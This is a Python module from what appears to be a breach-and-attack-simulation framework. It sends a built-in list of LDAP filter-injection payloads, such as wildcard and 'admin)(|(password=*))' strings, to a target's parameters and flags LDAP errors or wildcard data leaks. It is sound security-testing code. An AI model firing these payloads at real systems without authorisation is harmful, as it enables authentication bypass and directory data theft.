"""LDAP Injection testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

DEFAULT_LDAP_PAYLOADS = [
    "*", "*)(&", "*)(|(&", "pwd)", "*)(uid=*))(|(uid=*", "*))(|(cn=*",
    "*))%00", "admin)(&)", "admin)(|(password=*))", "x])(cn=*))(|(cn=*",
    "*()|%26'", "admin)(!(&(1=0", "*(uid=*))(|(uid=*",
]

class LDAPiModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="ldapi", description="LDAP injection testing", category="ldap",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-90"], tags=["injection", "ldap"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        return DEFAULT_LDAP_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        params = options.get("params", ["username", "user", "cn", "uid", "search"])
        return [AttackRequest(request_id=f"ldap-{uuid.uuid4().hex[:8]}", target=target, method="GET",
            path=options.get("path", "/"), params={param: p}) for p in payloads for param in params[:3]]

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text.lower()
        if any(k in body for k in ["ldap_search", "ldap error", "invalid dn syntax", "bad search filter"]):
            return ModuleResult(module_name="ldapi", target=request.target, status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload, response_code=response.status_code, response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms, evidence="LDAP error exposed in response", severity="high", mitre_technique_id="T1190")
        if payload == "*" and response.status_code == 200 and len(response.body) > 200:
            return ModuleResult(module_name="ldapi", target=request.target, status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence="LDAP wildcard returned data", severity="medium", mitre_technique_id="T1190")
        return ModuleResult(module_name="ldapi", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
